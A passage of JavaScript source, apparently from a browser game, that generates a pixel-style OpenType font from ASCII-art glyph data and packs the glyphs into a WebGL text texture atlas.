			this.arr[cur] = x&255//first bit determines negative
		}
		int16(x, cur = this.cur){
			if(x & 0x80000000) this.validate(~x,0x80007fff)//negative
			else this.validate(x,0x80007fff)
			this.arr[cur] = (x>>>8)&255//first bit determines negative
			this.arr[cur+1] = x&255
		}
		bits8(a,b,c,d,e,f,g,h, cur = this.cur){
			this.arr[cur] = h<<7|g<<6|f<<5|e<<4|d<<3|c<<2|b<<1|a
		}
		bits16(a,b,c,d,e,f,g,h, i,j,k,l,m,n,o,p, cur = this.cur){
			this.arr[cur] = p<<7|o<<6|n<<5|m<<4|l<<3|k<<2|j<<1|i
			this.arr[cur+1] = h<<7|g<<6|f<<5|e<<4|d<<3|c<<2|b<<1|a
		}
		fixed(x, cur = this.cur){
			this.validate(x*256,0xffffffff)
			this.arr[cur] = x&255
			this.arr[cur+1] = x>>>8
			this.arr[cur+2] = (x*256)&255
			this.arr[cur+3] = ((x*256)>>>8)&255
		}
		addarr(a){
			this.arr.push(...a.arr)
		}
		get cur(){
			return this.arr.length
		}
		checksum(){
			let sum = 0
			for(let i=0; i<this.arr.length; i+=4){
				sum += this.arr[i]<<24|this.arr[i+1]<<16|this.arr[i+2]<<8|this.arr[i+3]
			}
			return sum
		}
	}
	class ByteArrayReader{
		constructor(arr){
			this.arr = arr
			this.idx = 0
		}
		uint8(){return this.arr[this.idx++]}
		uint16(){return this.arr[this.idx++]<<8|this.arr[this.idx++]}
		int32(){return this.arr[this.idx++]<<24|this.arr[this.idx++]<<16|this.arr[this.idx++]<<8|this.arr[this.idx++]}
		ascii(len){
			let str = ""
			for(let i=0;i<len;i++) str += String.fromCharCode(this.uint8())
			return str
		}
		asciiVar(){//variable length
			let len = this.uint8()
			let str = ""
			for(let i=0;i<len;i++) str += String.fromCharCode(this.uint8())
			return str
		}
		skip(i){this.idx+=i}
		char(){return String.fromCharCode(this.arr[this.idx++])}
		toarr(len){
			let oi = this.idx
			this.idx += len
			return this.arr.slice(oi,this.idx)
		}
	}
	function generateFont(glyphs,segments,options={},fontPixelsPerEm){
		//spec: https://learn.microsoft.com/en-us/typography/opentype/spec
		const unitsPerEm = 64
		const bold = options.bold || false
		//segments contains in order: [first char, last char, pixels per em]

		const segmentCodes = segments.map(a => [a[0].codePointAt(0),a[1].codePointAt(0),a[2]])
		segmentCodes.sort((a,b) => a[0]-b[0])//sorted in order of increasing start code values
		const glyphOrder = [], glyphIds = new Map(), glyphOrderChars = [], realGlyphs = [], glyphPixelsEm = new Map()
		let gId = 0
		for(let s of segmentCodes){
			for(let i=s[0]; i<=s[1]; i++){
				glyphOrder[gId] = i
				glyphIds.set(i,gId)
				const char = String.fromCodePoint(i)
				glyphIds.set(char,gId)
				glyphOrderChars[gId] = char
				glyphPixelsEm.set(i, s[2])
				glyphPixelsEm.set(char, s[2])
				if(fontPixelsPerEm) fontPixelsPerEm[char] = s[2]
				gId++
			}
		}
		let minX = 0, minY = 0, maxX = 0, maxY = 0
		const glyphWidths = new Map()
		for(let i=0; i<glyphOrder.length; i++){//goes in sorted order
			const c = glyphOrderChars[i]
			realGlyphs.push(glyphOrder[i])
			const w = (glyphs[c].includes("\n") ? glyphs[c].indexOf("\n") : glyphs[c].length) / glyphPixelsEm.get(c)
			const h = glyphs[c].split("\n").length / glyphPixelsEm.get(c)
			glyphWidths.set(c,w)
			const g = glyphOrder[i]
			glyphWidths.set(g,w)
			if(w>maxX) maxX = w
			if(h>maxY) maxY = h
		}
		let mainarr = new ByteArrayBuilder()
		let glyfOffsets = {}, maxStuff = {points:0,contours:0}
		const tableDatas = {
			head:generateHead(),
			cmap:generateCmap(),
			hhea:generateHhea(),
			hmtx:generateHmtx(),
			name:generateName(),
			"OS/2":generateOS2(),
			post:generatePost(),
			glyf:generateGlyf(),
			loca:generateLoca(),
			maxp:generateMaxp()
		}, tableKeysSorted = Object.keys(tableDatas).sort()
		const numTables = tableKeysSorted.length
		let tableRecordOffsets = {}
		mainarr.uint32(0x00010000)//sfntversion
		mainarr.uint16(numTables)//numtables
		const searchRange = (2**Math.floor(Math.log2(numTables))) * 16
		mainarr.uint16(searchRange)//searchrange
		mainarr.uint16(Math.floor(Math.log2(numTables)))//entryselector
		mainarr.uint16((numTables * 16) - searchRange)//rangeshift
		for(let t of tableKeysSorted){//tablerecord
			tableRecordOffsets[t] = mainarr.cur
			if(t.length !== 4) throw new Error("tag must be length 4")
			mainarr.str(t)//tag
			mainarr.uint32(tableDatas[t].checksum()&0xffffffff)//checksum
			mainarr.uint32(0)//offset, set later
			mainarr.uint32(tableDatas[t].cur)//length
		}
		let headTableOffset
		for(let t in tableDatas){
			while(mainarr.cur%4) mainarr.uint8(0)//padding to maintain 4 byte boundary
			if(t === "head") headTableOffset = mainarr.cur
			mainarr.uint32(mainarr.cur, tableRecordOffsets[t]+8)//set offset
			mainarr.addarr(tableDatas[t])
		}
		mainarr.uint32((0xB1B0AFBA - mainarr.checksum())&0xffffffff, headTableOffset+8)//set checksumAdjustment

		function generateHead(){
			let arr = new ByteArrayBuilder()
			arr.uint16(1)//major
			arr.uint16(0)//minor
			arr.fixed(0)//revision
			arr.uint32(0)//checksumAdjustment, set later
			arr.uint32(0x5F0F3CF5)//magic number?
			arr.bits16(1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0)//flags https://learn.microsoft.com/en-us/typography/opentype/spec/head
			arr.uint16(unitsPerEm)//units per em
			arr.uint32(0), arr.uint32(0)//created
			arr.uint32(0), arr.uint32(0)//modified
			arr.int16(minX*unitsPerEm)
			arr.int16(minY*unitsPerEm)
			arr.int16(maxX*unitsPerEm)
			arr.int16(maxX*unitsPerEm)
			arr.bits16(bold,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0)//macStyle
			arr.uint16(8)//lowestRecPPEM (Smallest readable size)
			arr.int16(2)//fontDirectionHint
			arr.int16(1)//indexToLocFormat
			arr.int16(0)//glyphDataFormat
			return arr
		}
		function generateCmap(){
			let arr = new ByteArrayBuilder()
			arr.uint16(0)//version (cmap table format)
			arr.uint16(1)//numtables

			//EncodingRecord's
			arr.uint16(0)//platform id (unicode)
			arr.uint16(4)//encoding id (Unicode 2.0 and onwards semantics, Unicode BMP only)
			const unicodeOffsetOffset = arr.cur
			arr.uint32(0)//offset to subtable, set later

			arr.uint16(3)//platform id (windows)
			arr.uint16(10)//encoding id (Unicode BMP)
			const windowsOffsetOffset = arr.cur
			arr.uint32(0)//offset to subtable, set later

			const subtableStart = arr.cur
			arr.uint32(arr.cur, unicodeOffsetOffset)//set subtable offset
			arr.uint32(arr.cur, windowsOffsetOffset)//set subtable offset

			arr.uint16(12)//format
			arr.uint16(0)//reserved
			arr.uint32(0)//length, set later
			arr.uint32(0)//language
			arr.uint32(segmentCodes.length)//numgroups
			for(let s of segmentCodes){//SequentialMapGroup
				arr.uint32(s[0])//startCharCode
				arr.uint32(s[1])//endCharCode
				arr.uint32(glyphIds.get(s[0]))//startGlyphID
			}
			arr.uint32(arr.cur-subtableStart, subtableStart+4)//set length
			return arr
		}
		function generateHhea(){
			let arr = new ByteArrayBuilder()
			arr.uint16(1)//major
			arr.uint16(0)//minor
			arr.int16(maxY*unitsPerEm)//ascender
			arr.int16(minY*unitsPerEm)//descender
			arr.int16(2/8*unitsPerEm)//linegap
			arr.uint16((maxX-minX)*unitsPerEm)//advanceWidthMax
			arr.int16(minX*unitsPerEm)//minLeftSideBearing
			arr.int16(0)//minRightSideBearing
			arr.int16((maxX-minX)*unitsPerEm)//xMaxExtent
			arr.int16(1)//caretSlopeRise
			arr.int16(0)//caretSlopeRun
			arr.int16(0)//caretOffset
			arr.int16(0)
			arr.int16(0)
			arr.int16(0)
			arr.int16(0)
			arr.int16(0)//metricDataFormat
			arr.uint16(realGlyphs.length)//numberOfHMetrics
			return arr
		}
		function generateHmtx(){
			let arr = new ByteArrayBuilder()
			for(let g of realGlyphs){
				arr.uint16(glyphWidths.get(g)*unitsPerEm)//advanceWidth
				arr.int16(0)//left side bearing
			}
			return arr
		}
		function generateMaxp(){
			let arr = new ByteArrayBuilder()
			arr.uint32(0x00010000)//version: 0.5
			arr.uint16(realGlyphs.length)//numGlyphs
			arr.uint16(maxStuff.points)//maxPoints
			arr.uint16(maxStuff.contours)//maxContours
			arr.uint16(0)//maxCompositePoints
			arr.uint16(0)//maxCompositeContours
			arr.uint16(0)//maxZones
			arr.uint16(0)//maxTwilightPoints
			arr.uint16(0)//maxStorage
			arr.uint16(0)//maxFunctionDefs
			arr.uint16(0)//maxInstructionDefs
			arr.uint16(0)//maxStackElements
			arr.uint16(0)//maxSizeOfInstructions
			arr.uint16(0)//maxComponentElements
			arr.uint16(1)//maxComponentDepth
			return arr
		}
		function generateName(){
			const fullName = "pixelated font thingy"
			let arr = new ByteArrayBuilder()
			arr.uint16(0)//version
			arr.uint16(1)//count
			const storageOffsetOffset = arr.cur
			arr.uint16(0)//storageOffset, set later
			arr.uint16(0)//platform id (unicode)
			arr.uint16(3)//encoding id (Unicode 2.0 and onwards semantics, Unicode BMP only)
			arr.uint16(0)//language id
			arr.uint16(1)//name id (full name)
			arr.uint16(fullName.length)//length
			const fullNameOffsetOffset = arr.cur
			arr.uint16(0)//stringOffset, set later
			
			const storageStart = arr.cur
			arr.uint16(storageStart, storageOffsetOffset)
			arr.uint16(arr.cur-storageStart, fullNameOffsetOffset)
			arr.str(fullName)
			return arr
		}
		function generateOS2(){
			let arr = new ByteArrayBuilder()
			arr.uint16(5)//version
			arr.uint16(0)//xAvgCharWidth
			arr.uint16(bold?700:400)//usWeightClass: normal
			arr.uint16(5)//usWidthClass: medium
			arr.bits16(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0)
			arr.int16(0)//who cares about subscript, superscript, and strikeout???
			arr.int16(0)
			arr.int16(0)
			arr.int16(0)
			arr.int16(0)
			arr.int16(0)
			arr.int16(0)
			arr.int16(0)
			arr.int16(0)
			arr.int16(0)
			arr.int16(0)//s family class
			arr.uint8(0), arr.uint8(0), arr.uint8(0), arr.uint8(0), arr.uint8(0), arr.uint8(0), arr.uint8(0), arr.uint8(0), arr.uint8(0), arr.uint8(0)//panose
			arr.uint32(0), arr.uint32(0), arr.uint32(0), arr.uint32(0)//ulUnicodeRange
			arr.str("\0\0\0\0")//achVendID
			arr.bits16(0,0,0,0,0,bold,!bold,1,0,0,0,0,0,0,0,0)//fsSelection (Font selection flag)
			arr.uint16(Math.min(glyphOrder[0],0xFFFF))//usFirstCharIndex
			arr.uint16(Math.min(glyphOrder[glyphOrder.length-1],0xFFFF))//usLastCharIndex
			arr.int16(maxY*unitsPerEm)//sTypoAscender
			arr.int16(minY*unitsPerEm)//sTypoDescender
			arr.int16(2/8*unitsPerEm)//sTypoLineGap
			arr.uint16(maxY*unitsPerEm)//usWinAscent
			arr.uint16(-minY*unitsPerEm)//usWinDescent
			arr.uint32(0), arr.uint32(0)//ulCodePageRange
			arr.int16(0)//sxHeight
			arr.int16(0)//sCapHeight
			arr.uint16(0)//usDefaultChar
			arr.uint16(32)//usBreakChar
			arr.uint16(0)//usMaxContext, change if add ligature
			arr.uint16(0)//usLowerOpticalPointSize
			arr.uint16(0xFFFF)//usUpperOpticalPointSize
			return arr
		}
		function generatePost(){
			let arr = new ByteArrayBuilder()
			arr.uint32(0x00030000)//version: 3
			arr.fixed(0)//italicAngle
			arr.int16(0)//underlinePosition
			arr.int16(0)//underlineThickness
			arr.uint32(0)//isFixedPitch
			arr.uint32(0)//minMemType42
			arr.uint32(0)//maxMemType42
			arr.uint32(0)//minMemType1
			arr.uint32(0)//maxMemType1
			return arr
		}
		//useful images: https://i.stack.imgur.com/xywkL.png https://i.stack.imgur.com/LwZJF.png
		function generateGlyf(){
			let arr = new ByteArrayBuilder()
			for(let g of glyphOrderChars){
				const thisPixelsPerEm = glyphPixelsEm.get(g), scale = unitsPerEm/thisPixelsPerEm
				let filledPixels = []
				let rows = glyphs[g].split("\n")
				const width = rows[0].length, height = rows.length
				let pixelsLeft = new Array(width*height)
				for(let r=0; r<rows.length; r++){
					for(let c=0; c<rows[r].length; c++){
						if(rows[r][c] === "#" && !pixelsLeft[r*width+c]){
							let h = 1, fr = r+1//find height of piece
							while(true){
								if(!rows[fr] || rows[fr][c] !== "#" || pixelsLeft[fr*width+c]) break
								fr++, h++
							}
							let w = 1, fc = c+1//find width of piece
							wloop:while(true){
								fr = r
								while(fr-r < h){
									if(!rows[fr] || rows[fr][fc] !== "#" || pixelsLeft[fr*width+fc]) break wloop
									fr++
								}
								fc++, w++
							}
							for(fr=r; fr<r+h; fr++) for(fc=c; fc<c+w; fc++){
								pixelsLeft[fr*width+fc] = true
							}
							filledPixels.push(c,thisPixelsPerEm-r, w,h)
						}
					}
				}
				glyfOffsets[g] = arr.cur
				maxStuff.points = Math.max(maxStuff.points, filledPixels.length)
				maxStuff.contours = Math.max(maxStuff.contours, filledPixels.length*0.25)
				//Glyph Header
				arr.int16(filledPixels.length*0.25)//numberOfContours
				arr.int16(0)//xMin
				arr.int16((1-rows.length/thisPixelsPerEm)*unitsPerEm)//yMin
				arr.int16(rows[0].length/thisPixelsPerEm*unitsPerEm)//xMax
				arr.int16(unitsPerEm*unitsPerEm)//yMax

				//Simple Glyph Table
				for(let p=0; p<filledPixels.length; p+=4) arr.uint16(p+3)//endPtsOfContours
				arr.uint16(0)//instructionLength
				//no instructions
				let prevX = 0, prevY = 0
				for(let p=0; p<filledPixels.length; p+=4){
					let xPositive = filledPixels[p]-prevX >= 0, yPositive = filledPixels[p+1]-prevY >= 0
					arr.bits8(1,1,1,0,xPositive,yPositive,0,0)//flags
					arr.bits8(1,1,1,0,1,1,0,0)//flags
					arr.bits8(1,1,1,0,1,0,0,0)//flags, y is negative
					arr.bits8(1,1,1,0,0,1,0,0)//flags, x is negative
					prevX = filledPixels[p], prevY = filledPixels[p+1]-filledPixels[p+3]
				}
				prevX = 0
				for(let p=0; p<filledPixels.length; p+=4){
					arr.uint8(Math.abs(filledPixels[p]-prevX)*scale)//xCoordinates
					arr.uint8(filledPixels[p+2]*scale)
					arr.uint8(0)
					arr.uint8(filledPixels[p+2]*scale)//negative
					prevX = filledPixels[p]
				}
				prevY = 0
				for(let p=0; p<filledPixels.length; p+=4){
					arr.uint8(Math.abs(filledPixels[p+1]-prevY)*scale)//yCoordinates
					arr.uint8(0)
					arr.uint8(filledPixels[p+3]*scale)//negative
					arr.uint8(0)
					prevY = filledPixels[p+1]-filledPixels[p+3]
				}
			}
			glyfOffsets.length = arr.cur
			return arr
		}
		function generateLoca(){
			let arr = new ByteArrayBuilder()
			for(let g of glyphOrderChars){
				arr.uint32(glyfOffsets[g])
			}
			arr.uint32(glyfOffsets.length)
			return arr
		}
		for(let i of mainarr.arr){
			if((i&255) !== i) throw new Error("Incorrect value")
		}
		return new Uint8Array(mainarr.arr)
	}
	function chunkString (str, len) {
		const size = Math.ceil(str.length/len)
		const r = Array(size)
		let offset = 0
	
		for (let i = 0; i < size; i++) {
			r[i] = str.substr(offset, len)
			offset += len
		}
	
		return r
	}
	function chunkArray(array,chunkSize){
		let chunks = []
		for (let i = 0; i < array.length; i += chunkSize) {
			const chunk = array.slice(i, i + chunkSize);
			chunks.push(chunk)
		}
		return chunks
	}
	function hex2bin(hex){//from https://stackoverflow.com/questions/45053624/convert-hex-to-binary-in-javascript
		hex = hex.toLowerCase()
		var out = "";
		for(var c of hex) {
			switch(c) {
				case '0': out += "0000"; break;
				case '1': out += "0001"; break;
				case '2': out += "0010"; break;
				case '3': out += "0011"; break;
				case '4': out += "0100"; break;
				case '5': out += "0101"; break;
				case '6': out += "0110"; break;
				case '7': out += "0111"; break;
				case '8': out += "1000"; break;
				case '9': out += "1001"; break;
				case 'a': out += "1010"; break;
				case 'b': out += "1011"; break;
				case 'c': out += "1100"; break;
				case 'd': out += "1101"; break;
				case 'e': out += "1110"; break;
				case 'f': out += "1111"; break;
				default: return "";
			}
		}
		return out;
	}
	//stuff starting with "hex" are from unifont.zip
	const fontData = {
		"\0":"#####-\n#---#-\n#---#-\n#---#-\n#---#-\n#---#-\n#####-",
		" ":"----",
		"!":"#-\n#-\n#-\n#-\n#-\n--\n#-",
		'"':"#-#-\n#-#-\n",
		"#":"-#-#--\n-#-#--\n#####-\n-#-#--\n#####-\n-#-#--\n-#-#--",
		$:"--#---\n-####-\n#-----\n-###--\n----#-\n####--\n--#---",
		"%":"#---#-\n#--#--\n---#--\n--#---\n-#----\n-#--#-\n#---#-",
		"&":"--#---\n-#-#--\n--#---\n-##-#-\n#-##--\n#--#--\n-##-#-",
		"'":"#-\n#-",
		"(":"--#-\n-#--\n#---\n#---\n#---\n-#--\n--#-",
		")":"#---\n-#--\n--#-\n--#-\n--#-\n-#--\n#---",
		"*":"#-#-\n-#--\n#-#-",
		"+":"------\n--#---\n--#---\n#####-\n--#---\n--#---",
		",":"--\n--\n--\n--\n--\n--\n#-\n#-",
		"-":"------\n------\n------\n#####-",
		".":"--\n--\n--\n--\n--\n--\n#-",
		"/":"----#-\n---#--\n---#--\n--#---\n-#----\n-#----\n#-----",
		0:"-###--\n#---#-\n#--##-\n#-#-#-\n##--#-\n#---#-\n-###--",
		1:"--#---\n-##---\n--#---\n--#---\n--#---\n--#---\n#####-",
		2:"-###--\n#---#-\n----#-\n--##--\n-#----\n#---#-\n#####-",
		3:"-###--\n#---#-\n----#-\n--##--\n----#-\n#---#-\n-###--",
		4:"---##-\n--#-#-\n-#--#-\n#---#-\n#####-\n----#-\n----#-",
		5:"#####-\n#-----\n####--\n----#-\n----#-\n#---#-\n-###--",
		6:"--##--\n-#----\n#-----\n####--\n#---#-\n#---#-\n-###--",
		7:"#####-\n#---#-\n----#-\n---#--\n--#---\n--#---\n--#---",
		8:"-###--\n#---#-\n#---#-\n-###--\n#---#-\n#---#-\n-###--",
		9:"-###--\n#---#-\n#---#-\n-####-\n----#-\n---#--\n-##---",
		":":"--\n--\n#-\n--\n--\n--\n#-",
		";":"--\n--\n#-\n--\n--\n--\n#-\n#-",
		"<":"---#-\n--#--\n-#---\n#----\n-#---\n--#--\n---#-",
		"=":"------\n------\n#####-\n------\n------\n#####-",
		">":"#----\n-#---\n--#--\n---#-\n--#--\n-#---\n#----",
		"?":"-###--\n#---#-\n----#-\n---#--\n--#---\n------\n--#---",
		"@":"-------\n-####--\n#----#-\n#-##-#-\n#-#--#-\n#-####-\n#------\n-####--",
		A:"-###--\n#---#-\n#####-\n#---#-\n#---#-\n#---#-\n#---#-",
		B:"####--\n#---#-\n####--\n#---#-\n#---#-\n#---#-\n####--",
		C:"-###--\n#---#-\n#-----\n#-----\n#-----\n#---#-\n-###--",
		D:"####--\n#---#-\n#---#-\n#---#-\n#---#-\n#---#-\n####--",
		E:"#####-\n#-----\n###---\n#-----\n#-----\n#-----\n#####-",
		F:"#####-\n#-----\n###---\n#-----\n#-----\n#-----\n#-----",
		G:"-####-\n#-----\n#--##-\n#---#-\n#---#-\n#---#-\n-###--",
		H:"#---#-\n#---#-\n#####-\n#---#-\n#---#-\n#---#-\n#---#-",
		I:"###-\n-#--\n-#--\n-#--\n-#--\n-#--\n###-",
		J:"----#-\n----#-\n----#-\n----#-\n----#-\n#---#-\n-###--",
		K:"#---#-\n#--#--\n###---\n#--#--\n#---#-\n#---#-\n#---#-",
		L:"#-----\n#-----\n#-----\n#-----\n#-----\n#-----\n#####-",
		N:"#---#-\n##--#-\n#-#-#-\n#--##-\n#---#-\n#---#-\n#---#-",
		M:"#---#-\n##-##-\n#-#-#-\n#---#-\n#---#-\n#---#-\n#---#-",
		O:"-###--\n#---#-\n#---#-\n#---#-\n#---#-\n#---#-\n-###--",
		P:"####--\n#---#-\n####--\n#-----\n#-----\n#-----\n#-----",
		Q:"-###--\n#---#-\n#---#-\n#---#-\n#---#-\n#--#--\n-##-#-",
		R:"####--\n#---#-\n####--\n#---#-\n#---#-\n#---#-\n#---#-",
		S:"-####-\n#-----\n-###--\n----#-\n----#-\n#---#-\n-###--",
		T:"#####-\n--#---\n--#---\n--#---\n--#---\n--#---\n--#---",
		U:"#---#-\n#---#-\n#---#-\n#---#-\n#---#-\n#---#-\n-###--",
		V:"#---#-\n#---#-\n#---#-\n#---#-\n-#-#--\n-#-#--\n--#---",
		W:"#---#-\n#---#-\n#---#-\n#---#-\n#-#-#-\n##-##-\n#---#-",
		X:"#---#-\n-#-#--\n--#---\n-#-#--\n#---#-\n#---#-\n#---#-",
		Y:"#---#-\n-#-#--\n--#---\n--#---\n--#---\n--#---\n--#---",
		Z:"#####-\n----#-\n---#--\n--#---\n-#----\n#-----\n#####-",
		"[":"###-\n#---\n#---\n#---\n#---\n#---\n###-",
		"\\":"#-----\n-#----\n-#----\n--#---\n---#--\n---#--\n----#-",
		"]":"###-\n--#-\n--#-\n--#-\n--#-\n--#-\n###-",
		"^":"--#---\n-#-#--\n#---#-",
		"_":"------\n------\n------\n------\n------\n------\n#####-",
		"`":"#--\n-#-",
		a:"------\n------\n-###--\n----#-\n-####-\n#---#-\n-####-",
		b:"#-----\n#-----\n#-##--\n##--#-\n#---#-\n#---#-\n####--",
		c:"------\n------\n-###--\n#---#-\n#-----\n#---#-\n-###--",
		d:"----#-\n----#-\n-##-#-\n#--##-\n#---#-\n#---#-\n-####-",
		e:"------\n------\n-###--\n#---#-\n#####-\n#-----\n-####-",
		f:"--##-\n-#---\n####-\n-#---\n-#---\n-#---\n-#---",
		g:"------\n------\n-####-\n#---#-\n#---#-\n-####-\n----#-\n####--",
		h:"#-----\n#-----\n#-##--\n##--#-\n#---#-\n#---#-\n#---#-",
		i:"#-\n--\n#-\n#-\n#-\n#-\n#-",
		j:"----#-\n------\n----#-\n----#-\n----#-\n#---#-\n#---#-\n-###--",
		k:"#----\n#----\n#--#-\n#-#--\n##---\n#-#--\n#--#-",
		l:"#--\n#--\n#--\n#--\n#--\n#--\n-#-",
		m:"------\n------\n##-#--\n#-#-#-\n#-#-#-\n#---#-\n#---#-",
		n:"------\n------\n####--\n#---#-\n#---#-\n#---#-\n#---#-",
		o:"------\n------\n-###--\n#---#-\n#---#-\n#---#-\n-###--",
		p:"------\n------\n#-##--\n##--#-\n#---#-\n####--\n#-----\n#-----",
		q:"------\n------\n-##-#-\n#--##-\n#---#-\n-####-\n----#-\n----#-",
		r:"------\n------\n#-##--\n##--#-\n#-----\n#-----\n#-----",
		s:"------\n------\n-####-\n#-----\n-###--\n----#-\n####--",
		t:"-#--\n-#--\n###-\n-#--\n-#--\n-#--\n--#-",
		u:"------\n------\n#---#-\n#---#-\n#---#-\n#---#-\n-####-",
		v:"------\n------\n#---#-\n#---#-\n#---#-\n-#-#--\n--#---",
		w:"------\n------\n#---#-\n#---#-\n#-#-#-\n#-#-#-\n-####-",
		x:"------\n------\n#---#-\n-#-#--\n--#---\n-#-#--\n#---#-",
		y:"------\n------\n#---#-\n#---#-\n#---#-\n-####-\n----#-\n####--",
		z:"------\n------\n#####-\n---#--\n--#---\n-#----\n#####-",
		"{":"--#-\n-#--\n-#--\n#---\n-#--\n-#--\n--#-",
		"|":"#-\n#-\n#-\n#-\n#-\n#-\n#-",
		"}":"#---\n-#--\n-#--\n--#-\n-#--\n-#--\n#---",
		"~":"-##--#-\n#--##--",
		"":"-####-\n#-----\n-###--\n#---#-\n-###--\n----#-\n####--",
		"":"------\n#---#-\n-#-#--\n--#---\n-#-#--\n#---#-",
		"":"------\n--#---\n------\n#####-\n------\n--#---",
		"":"------\n-#-#--\n-#-#--\n------\n#---#-\n-###--",
		"":"-#####--\n##-#-##-\n##-#-##-\n#######-\n#-###-#-\n##---##-\n-#####--",
		"":"------\n-#-#--\n-#-#--\n------\n-###--\n#---#-",
		"":"-#####---\n#######--\n#--#--#-\n#--#--#-\n###-###-\n-##-##--\n-#-#-#--",
		"":"--------\n--#-----\n-##-----\n#######--\n-##-----\n--#-----",
		"":"--#---\n-###--\n#####-\n--#---\n--#---\n--#---\n--#---",
		"":"--------\n----#---\n----##--\n#######-\n----##--\n----#---",
		"":"--#---\n--#---\n--#---\n--#---\n#####-\n-###--\n--#---",
		"":"--#---\n--#---\n-###--\n-###--\n#####-\n#####-",
		"":"-------\n----##-\n--####-\n######-\n--####-\n----##-",
		"":"#####-\n#####-\n-###--\n-###--\n--#---\n--#---",
		"":"-------\n##-----\n####---\n######-\n####---\n##-----",
		//"":"----------------\n----------------\n----------------\n----------#------\n----------##-----\n----------###----\n##############---\n###############--\n##############---\n----------###----\n----------##-----\n----------#------"
		"":"hex,8,000000000000002442FF422400000000",
		"":"hex,8,0000081C2A0808080808082A1C080000",
		"":"hex,8,00000000007860504804020000000000",
		"":"hex,8,00000000001E060A1220400000000000",
		"":"hex,8,00000000004020120A061E0000000000",
		"":"hex,8,00000000000002044850607800000000",
		"":"hex,16,0000000000000000080018003FFC7FFC3FFC1800080000000000000000000000",
		"":"hex,8,000010387CFE38383838383838380000",
		"":"hex,8,00003838383838383838FE7C38100000",
		"":"hex,16,000000000000002000300038FFFCFFFEFFFC0038003000200000000000000000",
		"":"------##-------\n----##--##-----\n--##------##---\n##----------##-\n#-##------##-#-\n#---##--##---#-\n#-----##-----#-\n#------------#-\n#------------#-\n#------------#-\n#------------#-\n#------------#-\n##----------##-\n--##------##---\n----##--##-----\n------##-------",
		"":"#-----#-\n-#---#--\n--#-#---\n---#----\n#-#-#-#-\n-#---#--\n#-#-#-#-",
		"":"--####---\n-----##--\n-----###-\n----#--#-\n---#---#-\n--#----#-\n-#-------\n#--------",
		"":"-##-##--\n#######-\n#######-\n#######-\n-#####--\n--###---\n---#----",
		"":"-----##-\n----#-#-\n---#-#--\n#-#-#---\n-#-#----\n-##-----\n#--#----",
		"":"#----###-\n-#-##--#-\n--#---#--\n-#-#-#---\n-#--#----\n#--#-#---\n#-#---##-\n##----#--",
		"":"---##--\n--#-#--\n-#--##-\n-###-#-\n---###-\n--#----\n-#-----\n#------",
		"":"-----#-#-\n----#-#--\n----##-#-\n----###--\n---#-----\n--#------\n-#-------\n#--------",
		"":"-------#-\n------##-\n-----#-#-\n----#--#-\n---#---#-\n--#---#--\n-##-#-#--\n#---##---",
		"":"--###---\n--#-#---\n--#-#---\n-#---#--\n#-----#-\n#######-\n-#####--\n--###---",
		"":"----###-\n---#--#-\n--#--##-\n-#---#--\n#-----#-\n#######-\n-#####--\n--###---"
	}, fontSegments = [
		["\0","\0",8],[" ","~",8],["","",8],["","",8],["","",8],
		["","",8],["","",8],["","",8],["","",8],["","",16],["","",16],["","",16],
		["","",8],["","",8],["","",8],["","",8],
		["","",16],["","",8],["","",8],["","",8],
		["","",8],["","",8],["","",8],["","",8],["","",8],["","",8],["","",8]
	]
	const emojis = "                                 ".split(" ")
	for(let i in fontData){
		if(fontData[i].startsWith("hex")){
			let split = fontData[i].split(","), w = +split[1]
			let rows = chunkArray(hex2bin(split[2]).replace(/1/g,"#"),w)
			fontData[i] = rows.join("\n")
		}
	}
	document.body.insertAdjacentHTML("beforeend","<script src='features.js'><"+"/script>")
	let fontDataBold, fontPixelsPerEm
  let textCoords, textTexture, textCoordsPixels
  async function initFont(){
		fontPixelsPerEm = {}
		let thefontdata = generateFont(fontData,fontSegments,{},fontPixelsPerEm)
		let fontFace = new FontFace("thefont", thefontdata)
		fontFace.load().then(() => document.fonts.add(fontFace))
		
		fontDataBold = {}
		for(let c in fontData){
			let rows = fontData[c].split("\n")
			for(let r=0; r<rows.length; r++){
				let row = rows[r].split("")
				row.push(" ")
				for(let i=row.length-1; i>=0; i--){
					if(row[i] === "#") row[i+1] = "#"
				}
				rows[r] = row.join("")
			}
			fontDataBold[c] = rows.join("\n")
		}
		let theboldfontdata = generateFont(fontDataBold,fontSegments, {bold:true})
		let fontFaceBold = new FontFace("thefont", theboldfontdata, {weight:"bold"})
		fontFace.load().then(() => document.fonts.add(fontFaceBold))

    textCoords = {}
		textCoordsPixels = {}
		let fontAllStyle = {...fontData}
		for(let i in fontDataBold){
			fontAllStyle["b"+i] = fontDataBold[i]
			fontPixelsPerEm["b"+i] = fontPixelsPerEm[i]
		}

		const textureW = 256, textureH = 256
		let texturePacker = new BinaryTreeBinPacker(textureW,textureH)
		let textureRects = []

		for(let letter in fontAllStyle){
			let rows = fontAllStyle[letter].split("\n")
      let w = rows[0].length, h = fontPixelsPerEm[letter]//rows.length
      textureRects.push({w,h,letter})
    }
		await texturePacker.fit(textureRects)

    textTexture = new Uint8Array(textureW*textureH*4)
    for(let tex of textureRects){
      const {x,y,w,h,letter} = tex
			let pixelSize = fontPixelsPerEm[letter]
			textCoordsPixels[letter] = [x/pixelSize,y/pixelSize,w/pixelSize,h/pixelSize]
			textCoords[letter] = [ x/textureW,y/textureH, w/textureW,h/textureH ]
			let texX = x, texY = y
			for(let pix of fontAllStyle[letter]){
				if(pix === "\n") texX = x, texY++
				else{
					if(pix === "#"){
						textTexture[(texX+texY*textureW)*4] = 255
						textTexture[(texX+texY*textureW)*4+1] = 255
						textTexture[(texX+texY*textureW)*4+2] = 255
						textTexture[(texX+texY*textureW)*4+3] = 255
					}
					texX++
				}
			}
    }
    win.textTexture = ctx.createImageData(textureW,textureH)
		win.textTexture.data.set(textTexture)
    win.textCoords = textCoords
    
    textAtlas = gl.createTexture()
    gl.activeTexture(gl.TEXTURE9)
		gl.bindTexture(gl.TEXTURE_2D, textAtlas)
    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, textureW, textureH, 0, gl.RGBA, gl.UNSIGNED_BYTE, textTexture)
    gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.NEAREST)
    gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.NEAREST)
